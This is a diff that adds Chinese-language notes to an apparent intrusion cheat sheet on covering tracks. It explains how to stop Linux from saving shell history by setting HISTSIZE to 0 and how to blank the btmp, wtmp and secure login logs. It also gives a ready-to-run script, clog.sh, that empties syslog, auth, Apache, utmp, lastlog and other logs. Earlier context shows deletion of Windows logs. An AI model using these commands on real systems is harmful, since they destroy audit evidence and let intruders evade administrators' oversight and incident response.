@@ -47,6 +47,34 @@ C:\Windows\system32>del %WINDIR%\*.log /a/s/q/f
 history -c
 清除历史命令
 
+使系统不再保存历史命令
+vim /etc/profile 找到HISTSIZE这个值，修改为0
+
+删除访问日志
+失败日志：echo > /var/log/btmp
+成功日志：echo > /var/log/wtmp
+安全日志：echo > /var/log/secure
+
+删除日志脚本
+vim clog.sh
+#!/bin/bash
+echo > /var/log/syslog
+echo > /var/log/messages
+echo > /var/log/httpd/access_log
+echo > /var/log/httpd/error_log
+echo > /var/log/xferlog
+echo > /var/log/secure
+echo > /var/log/auth.log
+echo > /var/log/user.log
+echo > /var/log/wtmp
+echo > /var/log/btmp
+echo > /var/run/utmp
+echo > /var/log/lastlog
+history
+
+chmod +x clog.sh
+bash clog.sh 2>&1
+
 
 
 
